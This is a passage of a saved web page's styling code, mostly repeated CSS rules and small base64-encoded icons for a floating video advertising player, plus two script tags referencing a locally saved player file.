    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player.js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPS